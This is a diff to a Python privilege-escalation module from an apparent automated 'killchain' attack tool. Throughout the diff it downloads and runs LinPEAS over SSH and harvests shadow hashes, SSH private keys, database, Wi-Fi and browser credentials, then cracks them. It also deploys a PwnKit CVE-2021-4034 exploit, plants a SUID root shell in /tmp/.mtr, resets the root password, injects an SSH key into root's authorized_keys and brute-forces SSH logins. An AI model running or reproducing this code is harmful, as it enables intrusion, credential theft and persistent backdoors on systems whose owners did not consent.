@@ -13,8 +13,13 @@ try:
     from config import CFG, find_all_wordlists, find_wordlist
 except ImportError:
     CFG = {}
-    def find_wordlist(cat): return ""
-    def find_all_wordlists(cat): return []
+
+    def find_wordlist(cat):
+        return ""
+
+    def find_all_wordlists(cat):
+        return []
+
 
 import logging
 
@@ -25,17 +30,18 @@ from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
 # Use unified colors
 try:
     from core.colors import C
+
     C_GREEN, C_YELLOW, C_RED, C_CYAN = C.GREEN, C.YELLOW, C.RED, C.CYAN
     C_GREY, C_BLUE, C_MAGENTA, C_RESET = C.GRAY, C.BLUE, C.MAGENTA, C.RESET
 except ImportError:
-    C_GREEN  = "\033[92m"
+    C_GREEN = "\033[92m"
     C_YELLOW = "\033[93m"
-    C_RED    = "\033[91m"
-    C_CYAN   = "\033[96m"
-    C_GREY   = "\033[90m"
-    C_BLUE   = "\033[94m"
+    C_RED = "\033[91m"
+    C_CYAN = "\033[96m"
+    C_GREY = "\033[90m"
+    C_BLUE = "\033[94m"
     C_MAGENTA = "\033[95m"
-    C_RESET  = "\033[0m"
+    C_RESET = "\033[0m"
 
 logger = logging.getLogger("octopus.killchain.privesc")
 
@@ -63,17 +69,17 @@ def _run_linpeas(client, timeout: int = 180) -> tuple:
 
     # ── Download LinPEAS ─────────────────────────────────
     # Method 1: curl (most common)
-    dl_result = _ssh_exec(client,
-        f"curl -sLk --max-time 25 -o {dl_path} '{_LINPEAS_URL}' 2>&1 && echo DL_OK",
-        timeout=30)
+    dl_result = _ssh_exec(
+        client, f"curl -sLk --max-time 25 -o {dl_path} '{_LINPEAS_URL}' 2>&1 && echo DL_OK", timeout=30
+    )
     if "DL_OK" in dl_result:
         dl_ok = True
         print(f"    {C_GREEN}[+] Downloaded via curl{C_RESET}")
     else:
         # Method 2: wget
-        dl_result = _ssh_exec(client,
-            f"wget -q --no-check-certificate -T 25 -O {dl_path} '{_LINPEAS_URL}' 2>&1 && echo DL_OK",
-            timeout=30)
+        dl_result = _ssh_exec(
+            client, f"wget -q --no-check-certificate -T 25 -O {dl_path} '{_LINPEAS_URL}' 2>&1 && echo DL_OK", timeout=30
+        )
         if "DL_OK" in dl_result:
             dl_ok = True
             print(f"    {C_GREEN}[+] Downloaded via wget{C_RESET}")
@@ -117,9 +123,7 @@ def _run_linpeas(client, timeout: int = 180) -> tuple:
     if not pid:
         print(f"    {C_YELLOW}[!] Could not get LinPEAS PID — running inline{C_RESET}")
         # Fallback: run inline but with truncated output
-        _ssh_exec(client,
-            f"bash {dl_path} -s -N -q 2>/dev/null | head -500 > {out_path}",
-            timeout=timeout)
+        _ssh_exec(client, f"bash {dl_path} -s -N -q 2>/dev/null | head -500 > {out_path}", timeout=timeout)
     else:
         print(f"    {C_GREY}[*] LinPEAS PID: {pid}{C_RESET}")
         # Poll for completion every 5 seconds
@@ -142,9 +146,7 @@ def _run_linpeas(client, timeout: int = 180) -> tuple:
 
     # ── Read output file back ────────────────────────────
     # Read in chunks to avoid buffer issues (max 50KB)
-    lp_out = _ssh_exec(client,
-        f"head -c 50000 {out_path} 2>/dev/null",
-        timeout=15)
+    lp_out = _ssh_exec(client, f"head -c 50000 {out_path} 2>/dev/null", timeout=15)
 
     # Cleanup
     _ssh_exec(client, f"rm -f {dl_path} {out_path} 2>/dev/null", timeout=5)
@@ -157,7 +159,7 @@ def _run_linpeas(client, timeout: int = 180) -> tuple:
     print(f"    {C_GREEN}[+] LinPEAS output read ({len(lp_out)} bytes){C_RESET}")
 
     # ── Parse CVEs ───────────────────────────────────────
-    for m in re.finditer(r'(CVE-\d{4}-\d{4,7})', lp_out):
+    for m in re.finditer(r"(CVE-\d{4}-\d{4,7})", lp_out):
         cve = m.group(1)
         if cve not in cves_found:
             cves_found.append(cve)
@@ -168,11 +170,22 @@ def _run_linpeas(client, timeout: int = 180) -> tuple:
 
     # ── Extract key findings ─────────────────────────────
     _KEY_MARKERS = [
-        "Vulnerable to", "99% a]", "95% a]",
-        "SUID", "Sudo", "Capabilities", "writable",
-        "password", "Cron", "Unknown SUID",
-        "CVE-", "/bin/bash", "NOPASSWD",
-        "docker", "lxc", "lxd",
+        "Vulnerable to",
+        "99% a]",
+        "95% a]",
+        "SUID",
+        "Sudo",
+        "Capabilities",
+        "writable",
+        "password",
+        "Cron",
+        "Unknown SUID",
+        "CVE-",
+        "/bin/bash",
+        "NOPASSWD",
+        "docker",
+        "lxc",
+        "lxd",
     ]
     important_lines = []
     for line in lp_out.splitlines():
@@ -208,7 +221,7 @@ def _harvest_credentials(client, host: str) -> str:
         shadow_dump = _ssh_exec(client, "sudo -n cat /etc/shadow 2>/dev/null", timeout=10)
 
     if shadow_dump and "$" in shadow_dump:
-        shadow_file = f"/tmp/octopus_shadow_{host.replace('.','_')}.txt"
+        shadow_file = f"/tmp/octopus_shadow_{host.replace('.', '_')}.txt"
         try:
             with open(shadow_file, "w") as sf:
                 sf.write(shadow_dump)
@@ -218,6 +231,7 @@ def _harvest_credentials(client, host: str) -> str:
             if auto_crack and budget_left():
                 try:
                     from hash_cracker import HashCracker
+
                     hc = HashCracker()
                     hc.timeout = min(getattr(hc, "timeout", 600), max(20, max_seconds - int(time.time() - started)))
                     crack_result = hc.smart_crack(shadow_dump)
@@ -225,6 +239,7 @@ def _harvest_credentials(client, host: str) -> str:
                     for cracked_user, cracked_pwd in hc.get_cracked_pairs():
                         try:
                             from core.credentials import register_credential
+
                             register_credential("ssh", host, cracked_user, cracked_pwd)
                         except ImportError:
                             pass
@@ -232,7 +247,9 @@ def _harvest_credentials(client, host: str) -> str:
                 except ImportError:
                     output += f"\nAI: Shadow hashes extracted. Use [TOOL: crack_hashes {shadow_file}] for local GPU cracking.\n"
             else:
-                output += f"\nAI: Shadow hashes extracted. Use [TOOL: crack_hashes {shadow_file}] for local GPU cracking.\n"
+                output += (
+                    f"\nAI: Shadow hashes extracted. Use [TOOL: crack_hashes {shadow_file}] for local GPU cracking.\n"
+                )
         except Exception as e:
             output += f"\n[!] Failed to save shadow: {e}\n"
 
@@ -240,9 +257,9 @@ def _harvest_credentials(client, host: str) -> str:
     if not budget_left():
         output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
         return output
-    ssh_keys = _ssh_exec(client,
-        "find /root /home -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null",
-        timeout=10)
+    ssh_keys = _ssh_exec(
+        client, "find /root /home -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null", timeout=10
+    )
     if ssh_keys.strip():
         output += "\n[SSH PRIVATE KEYS]\n"
         for key_path in ssh_keys.strip().splitlines()[:5]:
@@ -257,11 +274,13 @@ def _harvest_credentials(client, host: str) -> str:
     if not budget_left():
         output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
         return output
-    db_creds = _ssh_exec(client,
+    db_creds = _ssh_exec(
+        client,
         "grep -rn 'password\\|passwd\\|db_pass\\|DB_PASS' "
         "/etc/mysql/ /etc/postgresql/ /var/www/ /opt/ "
         "2>/dev/null | grep -v Binary | head -20",
-        timeout=15)
+        timeout=15,
+    )
     if db_creds.strip():
         output += f"\n[DATABASE CREDENTIALS]\n{db_creds[:2000]}\n"
         print(f"    {C_GREEN}[+] DB credentials found{C_RESET}")
@@ -270,10 +289,9 @@ def _harvest_credentials(client, host: str) -> str:
     if not budget_left():
         output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
         return output
-    wifi = _ssh_exec(client,
-        "find /etc/NetworkManager -name '*.nmconnection' "
-        "-exec grep -l psk {} \\; 2>/dev/null",
-        timeout=5)
+    wifi = _ssh_exec(
+        client, "find /etc/NetworkManager -name '*.nmconnection' -exec grep -l psk {} \\; 2>/dev/null", timeout=5
+    )
     if wifi.strip():
         for wf in wifi.strip().splitlines()[:3]:
             wf = wf.strip()
@@ -285,10 +303,11 @@ def _harvest_credentials(client, host: str) -> str:
     if not budget_left():
         output += f"\n[!] Credential harvest budget reached ({max_seconds}s); skipped remaining checks.\n"
         return output
-    browser_files = _ssh_exec(client,
-        "find /root /home -name 'Login Data' -o -name 'key4.db' -o -name 'logins.json' "
-        "2>/dev/null | head -5",
-        timeout=10)
+    browser_files = _ssh_exec(
+        client,
+        "find /root /home -name 'Login Data' -o -name 'key4.db' -o -name 'logins.json' 2>/dev/null | head -5",
+        timeout=10,
+    )
     if browser_files.strip():
         output += "\n[BROWSER CREDENTIAL FILES]\n"
         for bf in browser_files.strip().splitlines():
@@ -359,18 +378,20 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
                         if basename in _SUID_SKIP:
                             continue  # known non-exploitable
                         if basename in _EXPLOITABLE_SUIDS:
-                            privesc_vectors.append({
-                                "type": "SUID",
-                                "binary": basename,
-                                "path": suid_path,
-                                "exploit": _EXPLOITABLE_SUIDS[basename]
-                            })
+                            privesc_vectors.append(
+                                {
+                                    "type": "SUID",
+                                    "binary": basename,
+                                    "path": suid_path,
+                                    "exploit": _EXPLOITABLE_SUIDS[basename],
+                                }
+                            )
                             found_exploitable = True
                     if found_exploitable:
                         print(f" {C_RED}← EXPLOITABLE SUID!{C_RESET}")
                         # Show only the ACTUALLY exploitable binaries
                         for vec in privesc_vectors:
-                            if vec['type'] == 'SUID':
+                            if vec["type"] == "SUID":
                                 print(f"      {C_RED}  {vec.get('path', vec['binary'])}{C_RESET}")
                     else:
                         print(f" {C_GREEN}✓{C_RESET}")
@@ -380,41 +401,49 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
                     # Extract NOPASSWD commands
                     for line in result.splitlines():
                         if "NOPASSWD" in line:
-                            privesc_vectors.append({
-                                "type": "SUDO_NOPASSWD",
-                                "binary": line.strip(),
-                                "exploit": f"sudo {line.split()[-1]} (run as root)"
-                            })
+                            privesc_vectors.append(
+                                {
+                                    "type": "SUDO_NOPASSWD",
+                                    "binary": line.strip(),
+                                    "exploit": f"sudo {line.split()[-1]} (run as root)",
+                                }
+                            )
                             print(f" {C_RED}← SUDO PRIVESC: {line.strip()[:80]}{C_RESET}")
 
                 # Docker group
                 elif label == "Docker group" and "docker" in result.lower():
-                    privesc_vectors.append({
-                        "type": "DOCKER",
-                        "binary": "docker",
-                        "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
-                    })
+                    privesc_vectors.append(
+                        {
+                            "type": "DOCKER",
+                            "binary": "docker",
+                            "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt bash",
+                        }
+                    )
                     print(f" {C_RED}← DOCKER PRIVESC!{C_RESET}")
 
                 # LXD
                 elif label == "LXD group" and "lxd" in result.lower():
-                    privesc_vectors.append({
-                        "type": "LXD",
-                        "binary": "lxd",
-                        "exploit": "lxc init alpine privesc -c security.privileged=true"
-                    })
+                    privesc_vectors.append(
+                        {
+                            "type": "LXD",
+                            "binary": "lxd",
+                            "exploit": "lxc init alpine privesc -c security.privileged=true",
+                        }
+                    )
                     print(f" {C_RED}← LXD PRIVESC!{C_RESET}")
 
                 # Writable passwd
                 elif label == "Writable /etc/passwd":
                     try:
                         perms = result.split()[0]  # e.g. -rw-rw-rw-
-                        if len(perms) >= 8 and (perms[5] == 'w' or perms[8] == 'w'):
-                            privesc_vectors.append({
-                                "type": "WRITABLE_PASSWD",
-                                "binary": "/etc/passwd",
-                                "exploit": "echo 'hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash' >> /etc/passwd"
-                            })
+                        if len(perms) >= 8 and (perms[5] == "w" or perms[8] == "w"):
+                            privesc_vectors.append(
+                                {
+                                    "type": "WRITABLE_PASSWD",
+                                    "binary": "/etc/passwd",
+                                    "exploit": "echo 'hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash' >> /etc/passwd",
+                                }
+                            )
                             print(f" {C_RED}← WRITABLE PASSWD!{C_RESET}")
                         else:
                             print(f" {C_GREEN}✓{C_RESET}")
@@ -425,12 +454,14 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
                 elif label == "Writable /etc/shadow":
                     try:
                         perms = result.split()[0]
-                        if len(perms) >= 8 and (perms[5] == 'w' or perms[8] == 'w'):
-                            privesc_vectors.append({
-                                "type": "WRITABLE_SHADOW",
-                                "binary": "/etc/shadow",
-                                "exploit": "replace root hash in /etc/shadow"
-                            })
+                        if len(perms) >= 8 and (perms[5] == "w" or perms[8] == "w"):
+                            privesc_vectors.append(
+                                {
+                                    "type": "WRITABLE_SHADOW",
+                                    "binary": "/etc/shadow",
+                                    "exploit": "replace root hash in /etc/shadow",
+                                }
+                            )
                             print(f" {C_RED}← WRITABLE SHADOW!{C_RESET}")
                         else:
                             print(f" {C_GREEN}✓{C_RESET}")
@@ -441,10 +472,14 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
                     print(f" {C_GREEN}✓{C_RESET}")
                     # Include evidence for important checks, not only status.
                     _SHOW_DATA_LABELS = {
-                        "Backup files", "Config files with passwords",
-                        "SSH private keys", "Interesting configs",
-                        "Internal listeners", "Crontab",
-                        "Writable scripts in PATH", "Kernel info",
+                        "Backup files",
+                        "Config files with passwords",
+                        "SSH private keys",
+                        "Interesting configs",
+                        "Internal listeners",
+                        "Crontab",
+                        "Writable scripts in PATH",
+                        "Kernel info",
                     }
                     if label in _SHOW_DATA_LABELS and result.strip():
                         for line in result.strip().splitlines()[:5]:
@@ -452,7 +487,7 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
                             if line_clean:
                                 print(f"      {C_CYAN}  {line_clean[:120]}{C_RESET}")
                         if len(result.strip().splitlines()) > 5:
-                            print(f"      {C_GREY}  ... ({len(result.strip().splitlines())-5} more lines){C_RESET}")
+                            print(f"      {C_GREY}  ... ({len(result.strip().splitlines()) - 5} more lines){C_RESET}")
             else:
                 print(f" {C_GREY}—{C_RESET}")
 
@@ -524,7 +559,7 @@ def run_privesc(host: str, user: str, password: str, port: int = 22) -> str:
 
                         if has_gcc:
                             # Deploy C-based PwnKit exploit
-                            pwnkit_c = r'''
+                            pwnkit_c = r"""
 #include <stdio.h>
 #include <stdlib.h>
 void gconv() {}
@@ -534,7 +569,7 @@ void gconv_init() {
     system("mkdir -p /tmp/.mtr && cp /bin/bash /tmp/.mtr/rootbash && chmod +s /tmp/.mtr/rootbash");
     system("/tmp/.mtr/rootbash -p -c 'id > /tmp/.mtr/proof.txt'");
 }
-'''
+"""
                             gconv_modules = "module  UTF-8//    INTERNAL    ../pwnkit    2"
                             deploy_cmds = [
                                 "mkdir -p /tmp/.mtr/GCONV_PATH=. && cd /tmp/.mtr",
@@ -548,14 +583,20 @@ void gconv_init() {
                             for deploy_cmd in deploy_cmds:
                                 _ssh_exec(client, deploy_cmd, timeout=10)
 
-                            check = _ssh_exec(client, "ls -la /tmp/.mtr/rootbash 2>/dev/null && /tmp/.mtr/rootbash -p -c 'id' 2>&1", timeout=10)
+                            check = _ssh_exec(
+                                client,
+                                "ls -la /tmp/.mtr/rootbash 2>/dev/null && /tmp/.mtr/rootbash -p -c 'id' 2>&1",
+                                timeout=10,
+                            )
                             output += f"  [PROOF] PwnKit result: {check.strip()[:200]}\n"
                             if "uid=0" in check or "euid=0" in check:
                                 pwnkit_ok = True
                                 got_root = True
                                 output += "  [+] PWNKIT CVE-2021-4034 PRIVESC SUCCESSFUL!\n"
                                 print(f"    {C_GREEN}[+] ROOT via PwnKit (gcc)!{C_RESET}")
-                                shadow = _ssh_exec(client, "/tmp/.mtr/rootbash -p -c 'cat /etc/shadow' 2>/dev/null", timeout=10)
+                                shadow = _ssh_exec(
+                                    client, "/tmp/.mtr/rootbash -p -c 'cat /etc/shadow' 2>/dev/null", timeout=10
+                                )
                                 if shadow and "$" in shadow:
                                     output += f"\n[PROOF: /etc/shadow via PwnKit]\n{shadow[:2000]}\n"
 
@@ -571,9 +612,11 @@ void gconv_init() {
                             pk_downloaded = False
 
                             for pk_url in _PWNKIT_URLS:
-                                dl = _ssh_exec(client,
+                                dl = _ssh_exec(
+                                    client,
                                     f"curl -sLk --max-time 20 -o {pk_path} '{pk_url}' 2>&1 && echo DL_OK",
-                                    timeout=25)
+                                    timeout=25,
+                                )
                                 if "DL_OK" in dl:
                                     # Verify it's a real binary (> 1KB)
                                     sz = _ssh_exec(client, f"wc -c < {pk_path} 2>/dev/null", timeout=5).strip()
@@ -585,9 +628,11 @@ void gconv_init() {
                                     except ValueError:
                                         pass
                                 # Try wget fallback
-                                dl = _ssh_exec(client,
+                                dl = _ssh_exec(
+                                    client,
                                     f"wget -q --no-check-certificate -T 20 -O {pk_path} '{pk_url}' 2>&1 && echo DL_OK",
-                                    timeout=25)
+                                    timeout=25,
+                                )
                                 if "DL_OK" in dl:
                                     sz = _ssh_exec(client, f"wc -c < {pk_path} 2>/dev/null", timeout=5).strip()
                                     try:
@@ -603,20 +648,24 @@ void gconv_init() {
 
                                 # The PwnKit adapter creates the SUID root shell first.
                                 # Step 1: Create SUID bash via PwnKit
-                                _ssh_exec(client,
+                                _ssh_exec(
+                                    client,
                                     f"{pk_path} 'cp /bin/bash /tmp/.mtr/rootbash && chmod 4755 /tmp/.mtr/rootbash' 2>/dev/null",
-                                    timeout=15)
+                                    timeout=15,
+                                )
                                 # Also try running directly (some PwnKit variants)
-                                pk_result = _ssh_exec(client,
-                                    f"{pk_path} id 2>&1 || {pk_path} 2>&1 | head -10",
-                                    timeout=15)
+                                pk_result = _ssh_exec(
+                                    client, f"{pk_path} id 2>&1 || {pk_path} 2>&1 | head -10", timeout=15
+                                )
                                 output += f"  [*] PwnKit binary result: {pk_result.strip()[:300]}\n"
                                 print(f"    {C_CYAN}[*] PwnKit binary output: {pk_result.strip()[:100]}{C_RESET}")
 
                                 # Step 2: Check if rootbash was created with SUID
-                                rootbash_check = _ssh_exec(client,
+                                rootbash_check = _ssh_exec(
+                                    client,
                                     "ls -la /tmp/.mtr/rootbash 2>/dev/null && /tmp/.mtr/rootbash -p -c 'id' 2>&1",
-                                    timeout=10)
+                                    timeout=10,
+                                )
                                 has_rootbash = "uid=0" in rootbash_check or "euid=0" in rootbash_check
 
                                 if "uid=0" in pk_result or "euid=0" in pk_result or "root" in pk_result or has_rootbash:
@@ -629,15 +678,13 @@ void gconv_init() {
                                     root_cmd = "/tmp/.mtr/rootbash -p -c" if has_rootbash else f"{pk_path}"
 
                                     # Step 3: Extract /etc/shadow
-                                    shadow = _ssh_exec(client,
-                                        f"{root_cmd} 'cat /etc/shadow' 2>/dev/null",
-                                        timeout=15)
+                                    shadow = _ssh_exec(client, f"{root_cmd} 'cat /etc/shadow' 2>/dev/null", timeout=15)
                                     if shadow and "root:" in shadow:
                                         print(f"    {C_GREEN}[+] Extracted /etc/shadow ({len(shadow)} bytes){C_RESET}")
                                         output += f"\n[PROOF: /etc/shadow via PwnKit]\n{shadow[:2000]}\n"
 
                                         # Retain the shadow-file evidence with other loot.
-                                        loot_dir = os.path.expanduser(f"~/OCTOPUS/loot/{host.replace('.','_')}")
+                                        loot_dir = os.path.expanduser(f"~/OCTOPUS/loot/{host.replace('.', '_')}")
                                         os.makedirs(loot_dir, exist_ok=True)
                                         shadow_path = os.path.join(loot_dir, "shadow")
                                         try:
@@ -648,9 +695,11 @@ void gconv_init() {
                                             logging.debug(f"Suppressed in privesc.py: {_exc}")
 
                                     # Step 4: Try chpasswd (may or may not work)
-                                    chpasswd_result = _ssh_exec(client,
+                                    chpasswd_result = _ssh_exec(
+                                        client,
                                         f"{root_cmd} 'echo root:octopus | chpasswd 2>&1 && echo CHPASSWD_OK'",
-                                        timeout=15)
+                                        timeout=15,
+                                    )
 
                                     if "CHPASSWD_OK" in chpasswd_result:
                                         # Verify by trying SSH as root
@@ -659,24 +708,35 @@ void gconv_init() {
                                         test_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                         pw_changed = False
                                         try:
-                                            test_client.connect(host, port=port, username="root",
-                                                              password="octopus", timeout=10,
-                                                              allow_agent=False, look_for_keys=False)
+                                            test_client.connect(
+                                                host,
+                                                port=port,
+                                                username="root",
+                                                password="octopus",
+                                                timeout=10,
+                                                allow_agent=False,
+                                                look_for_keys=False,
+                                            )
                                             test_client.close()
                                             pw_changed = True
                                         except Exception as _exc:
                                             logging.debug(f"Suppressed in privesc.py: {_exc}")
 
                                         if pw_changed:
-                                            print(f"    {C_GREEN}[+] Root password changed to 'octopus' — VERIFIED{C_RESET}")
+                                            print(
+                                                f"    {C_GREEN}[+] Root password changed to 'octopus' — VERIFIED{C_RESET}"
+                                            )
                                             output += "\n[+] Root password changed to 'octopus' — SSH verified!\n"
                                             try:
                                                 from core.credentials import register_credential
+
                                                 register_credential("ssh", host, "root", "octopus")
                                             except ImportError:
                                                 pass
                                         else:
-                                            print(f"    {C_YELLOW}[!] chpasswd reported OK but SSH login failed — trying SSH key{C_RESET}")
+                                            print(
+                                                f"    {C_YELLOW}[!] chpasswd reported OK but SSH login failed — trying SSH key{C_RESET}"
+                                            )
                                             output += "\n[!] chpasswd output OK but SSH verify failed.\n"
                                     else:
                                         print(f"    {C_YELLOW}[!] chpasswd failed — injecting SSH key instead{C_RESET}")
@@ -684,33 +744,52 @@ void gconv_init() {
 
                                     # Step 5: ALWAYS inject SSH key as root (backup access method)
                                     import subprocess
+
                                     local_key_path = os.path.expanduser("~/.ssh/id_rsa.pub")
                                     if not os.path.isfile(local_key_path):
                                         # Generate key if missing
                                         subprocess.run(
-                                            ["ssh-keygen", "-t", "rsa", "-b", "2048",
-                                             "-f", os.path.expanduser("~/.ssh/id_rsa"),
-                                             "-N", ""],
-                                            capture_output=True, timeout=15
+                                            [
+                                                "ssh-keygen",
+                                                "-t",
+                                                "rsa",
+                                                "-b",
+                                                "2048",
+                                                "-f",
+                                                os.path.expanduser("~/.ssh/id_rsa"),
+                                                "-N",
+                                                "",
+                                            ],
+                                            capture_output=True,
+                                            timeout=15,
                                         )
                                     if os.path.isfile(local_key_path):
                                         with open(local_key_path) as kf:
                                             pub_key = kf.read().strip()
-                                        _ssh_exec(client,
+                                        _ssh_exec(
+                                            client,
                                             f"{root_cmd} 'mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
-                                            f"echo \"{pub_key}\" >> /root/.ssh/authorized_keys && "
+                                            f'echo "{pub_key}" >> /root/.ssh/authorized_keys && '
                                             f"chmod 600 /root/.ssh/authorized_keys'",
-                                            timeout=15)
+                                            timeout=15,
+                                        )
                                         # Verify key auth
                                         test2 = paramiko.SSHClient()
                                         test2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                         key_ok = False
                                         try:
                                             priv_key = paramiko.RSAKey.from_private_key_file(
-                                                os.path.expanduser("~/.ssh/id_rsa"))
-                                            test2.connect(host, port=port, username="root",
-                                                         pkey=priv_key, timeout=10,
-                                                         allow_agent=False, look_for_keys=False)
+                                                os.path.expanduser("~/.ssh/id_rsa")
+                                            )
+                                            test2.connect(
+                                                host,
+                                                port=port,
+                                                username="root",
+                                                pkey=priv_key,
+                                                timeout=10,
+                                                allow_agent=False,
+                                                look_for_keys=False,
+                                            )
                                             test2.close()
                                             key_ok = True
                                         except Exception as _exc:
@@ -722,11 +801,14 @@ void gconv_init() {
                                             # Register key-based root access
                                             try:
                                                 from core.credentials import register_credential
+
                                                 register_credential("ssh", host, "root", "__KEY_AUTH__")
                                             except ImportError:
                                                 pass
                                         else:
-                                            print(f"    {C_YELLOW}[!] SSH key injection done but verify failed (sshd config?){C_RESET}")
+                                            print(
+                                                f"    {C_YELLOW}[!] SSH key injection done but verify failed (sshd config?){C_RESET}"
+                                            )
                                             output += "[!] SSH key injection: key placed but auth failed.\n"
 
                                     output += "\n  [+] \u2713 ROOT ACCESS CONFIRMED\n"
@@ -750,7 +832,9 @@ void gconv_init() {
                             output += "  [+] SUID FIND PRIVESC SUCCESSFUL!\n"
 
                     elif vbin == "python" or vbin == "python3":
-                        id_result = _ssh_exec(client, f"{vbin} -c 'import os; os.setuid(0); os.system(\"id\")' 2>&1", timeout=10)
+                        id_result = _ssh_exec(
+                            client, f"{vbin} -c 'import os; os.setuid(0); os.system(\"id\")' 2>&1", timeout=10
+                        )
                         output += f"  [PROOF] {vbin} setuid → {id_result.strip()}\n"
                         print(f"    {C_CYAN}[PROOF] {vbin} → {id_result.strip()[:80]}{C_RESET}")
                         if "uid=0" in id_result:
@@ -779,7 +863,9 @@ void gconv_init() {
 
                 elif vtype == "DOCKER":
                     output += "\n[PRIVESC ATTEMPT: DOCKER]\n"
-                    id_result = _ssh_exec(client, "docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow 2>&1 | head -10", timeout=30)
+                    id_result = _ssh_exec(
+                        client, "docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow 2>&1 | head -10", timeout=30
+                    )
                     output += f"  [PROOF] docker shadow dump → {id_result.strip()[:500]}\n"
                     if "$" in id_result and "root:" in id_result:
                         got_root = True
@@ -800,7 +886,9 @@ void gconv_init() {
                     output += "\n[PRIVESC ATTEMPT: WRITABLE SHADOW]\n"
                     print(f"    {C_RED}[*] Exploiting writable /etc/shadow...{C_RESET}")
                     # Generate a known hash for password 'm3tatr0n'
-                    gen_hash = _ssh_exec(client, "openssl passwd -1 -salt octopus 'm3tatr0n' 2>/dev/null", timeout=5).strip()
+                    gen_hash = _ssh_exec(
+                        client, "openssl passwd -1 -salt octopus 'm3tatr0n' 2>/dev/null", timeout=5
+                    ).strip()
                     if not gen_hash or gen_hash.startswith("[!]"):
                         gen_hash = "$1$octopus$f5P0MG/LjCXF.GUyFKPyB."
                     output += f"  Generated hash: {gen_hash}\n"
@@ -822,11 +910,14 @@ void gconv_init() {
                         # Register new root credential
                         try:
                             from core.credentials import register_credential
+
                             register_credential("ssh", host, "root", "m3tatr0n")
                         except ImportError:
                             pass
                         # Dump shadow as proof
-                        shadow = _ssh_exec(client, "echo 'm3tatr0n' | su -c 'cat /etc/shadow' root 2>/dev/null", timeout=10)
+                        shadow = _ssh_exec(
+                            client, "echo 'm3tatr0n' | su -c 'cat /etc/shadow' root 2>/dev/null", timeout=10
+                        )
                         if shadow and "$" in shadow:
                             output += f"\n[PROOF: /etc/shadow via writable shadow]\n{shadow[:2000]}\n"
                     else:
@@ -842,6 +933,7 @@ void gconv_init() {
                                     print(f"    {C_GREEN}[+] ROOT via SSH with new shadow password!{C_RESET}")
                                     try:
                                         from core.credentials import register_credential
+
                                         register_credential("ssh", host, "root", "m3tatr0n")
                                     except ImportError:
                                         pass
@@ -892,12 +984,21 @@ void gconv_init() {
         login_users = []
         for line in passwd_out.splitlines():
             p = line.split(":")
-            if len(p) >= 7 and p[6] not in ("/usr/sbin/nologin", "/bin/false",
-                                              "/sbin/nologin", "/bin/nologin", ""):
+            if len(p) >= 7 and p[6] not in ("/usr/sbin/nologin", "/bin/false", "/sbin/nologin", "/bin/nologin", ""):
                 uname = p[0]
-                if uname not in ("daemon", "bin", "sys", "sync",
-                                  "games", "man", "lp", "mail", "news",
-                                  "nobody", user):  # skip current user but keep root
+                if uname not in (
+                    "daemon",
+                    "bin",
+                    "sys",
+                    "sync",
+                    "games",
+                    "man",
+                    "lp",
+                    "mail",
+                    "news",
+                    "nobody",
+                    user,
+                ):  # skip current user but keep root
                     login_users.append(uname)
 
         # Ensure root is tested FIRST (most valuable)
@@ -930,25 +1031,27 @@ void gconv_init() {
                     test_client = _paramiko.SSHClient()
                     test_client.set_missing_host_key_policy(_paramiko.AutoAddPolicy())
                     test_client.connect(
-                        host, port=port, username=target_user,
-                        password=pwd_attempt, timeout=3,  # fast timeout
-                        allow_agent=False, look_for_keys=False,
-                        banner_timeout=5
+                        host,
+                        port=port,
+                        username=target_user,
+                        password=pwd_attempt,
+                        timeout=3,  # fast timeout
+                        allow_agent=False,
+                        look_for_keys=False,
+                        banner_timeout=5,
                     )
                     # Login succeeded!
                     _, stdout, _ = test_client.exec_command("id", timeout=3)
                     id_out = stdout.read().decode("utf-8", errors="replace").strip()
                     test_client.close()
 
-                    successful_logins.append({
-                        "user": target_user, "password": pwd_attempt,
-                        "id": id_out[:100]
-                    })
+                    successful_logins.append({"user": target_user, "password": pwd_attempt, "id": id_out[:100]})
                     output += f"  [+] SSH {target_user}:{pwd_attempt} → {id_out[:80]}\n"
                     print(f"    {C_GREEN}[+] LOGIN: {target_user}:{pwd_attempt} → {id_out[:60]}{C_RESET}")
 
                     try:
                         from core.credentials import register_credential
+
                         register_credential("ssh", host, target_user, pwd_attempt)
                     except ImportError:
                         pass
